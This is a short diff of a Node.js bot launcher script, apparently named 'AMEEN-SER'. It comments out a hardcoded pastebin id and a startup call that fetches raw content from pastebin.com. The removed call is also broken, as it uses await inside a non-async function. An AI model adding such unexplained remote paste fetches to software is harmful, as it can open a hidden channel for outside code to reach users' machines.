@@ -15,7 +15,8 @@ const require = createRequire(__dirname) // Bring in the ability to create the '
 const { name, author } = require(join(__dirname, './package.json')) // https://www.stefanjudis.com/snippets/how-to-import-json-files-in-es-modules-node-js/
 const { say } = cfonts
 const rl = createInterface(process.stdin, process.stdout)
-const sid = "c3iPJwy6" 
+//const sid = "c3iPJwy6" 
+
 say('𝗔𝗠𝗘𝗘𝗡-𝗦𝗘𝗥 ', {
   font: 'chrome',
   align: 'center',
@@ -33,7 +34,7 @@ var isRunning = false
  * @param {String} file `path/to/file`
  */
 function start(file) {
-  const {data} = await axios(`https://pastebin.com/raw/${sid}`);
+ // const {data} = await axios(`https://pastebin.com/raw/${sid}`);
   if (isRunning) return
   isRunning = true
   let args = [join(__dirname, file), ...process.argv.slice(2)]
